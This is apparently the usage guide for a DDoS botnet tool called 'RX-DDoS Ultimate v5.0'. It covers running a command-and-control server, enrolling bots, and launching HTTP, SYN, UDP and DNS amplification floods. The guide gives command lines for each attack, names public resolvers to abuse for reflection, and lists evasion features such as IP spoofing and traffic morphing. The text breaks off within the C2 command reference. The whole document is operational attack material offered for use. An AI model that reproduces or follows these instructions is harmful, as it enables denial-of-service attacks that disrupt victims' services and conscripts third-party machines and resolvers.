# RX-DDoS Ultimate v5.0 - Complete Usage Guide

## 🎯 Basic Usage
1. **Start C2 Server**: Option 1 in menu (Ports 501,502,503)
2. **Connect Bots**: Option 2 on other machines  
3. **Launch Attack**: Through C2 or direct mode (Option 3)

## 🔧 Attack Types

### HTTP Flood
- **Layer**: Application (Layer 7)
- **Purpose**: Web server resource exhaustion
- **Usage**: `--attack http --target example.com --threads 500`
- **Features**: SSL support, custom headers, session maintenance

### SYN Flood  
- **Layer**: Network (Layer 3)
- **Purpose**: TCP handshake exploitation
- **Requires**: Root/Administrator privileges
- **Usage**: `sudo python rx-ddos.py --attack syn --target IP --packets 10000`
- **Features**: IP spoofing, flag manipulation, window size control

### UDP Flood
- **Layer**: Transport (Layer 4) 
- **Purpose**: Bandwidth saturation
- **Usage**: `--attack udp --target IP --port 53 --packets 20000`
- **Protocols**: DNS, NTP, SNMP, Chargen, QOTD

### DNS Amplification
- **Type**: Reflection attack
- **Amplification**: 10x-50x
- **Resolvers**: 8.8.8.8, 1.1.1.1, 9.9.9.9, etc.
- **Usage**: `--attack dns --target victim.com --amplifiers 50`

## ⚙️ Advanced Configuration

### Bot Management
Edit `config.json` for:
- **Bot capacity**: `"max_bots": 5000`
- **Heartbeat intervals**: `"heartbeat_interval": 30`
- **Reconnection settings**: `"reconnect_attempts": 5`
- **Geographic distribution**: Regional bot grouping

### Attack Optimization  
- **Thread management**: `"max_threads": 10000`
- **Connection pooling**: `"connection_pool": 5000`
- **Packet optimization**: `"packet_size": 64-1500`
- **Timing control**: Ramp-up, sustained, cool-down phases

### Security & Stealth
- **Encryption**: Fernet AES-256 with key rotation
- **Traffic morphing**: Pattern randomization
- **IP spoofing**: Source address rotation
- **Protocol obfuscation**: Header manipulation

### Performance Tuning
- **Memory allocation**: `"max_memory": "4GB"`
- **Network buffers**: `"buffer_size": "1GB"`
- **CPU optimization**: Multi-core processing
- **I/O optimization**: Async operations

## 🚀 Command Reference

### C2 Server Commands
```bash
# Basic server
python rx-ddos.py --mode server --port 501

# Advanced server
python rx-ddos.py --mode server --max-bots 5000 --encryption high

# Bot monitoring
python rx-ddos.py --mode monitor --show-bots --detailed